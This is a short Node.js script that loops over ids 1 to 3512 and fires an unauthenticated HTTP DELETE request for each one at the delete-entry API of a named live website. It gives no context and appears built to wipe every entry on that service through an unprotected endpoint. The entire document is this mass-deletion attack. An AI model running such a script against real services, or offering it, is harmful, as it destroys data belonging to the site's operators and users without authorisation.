var axios = require('axios')

for(let i = 1; i <= 3512; i++) {
     axios.delete(`https://semainier.qilibri.fr/api/delete-entry?id=${i}`)
}
     
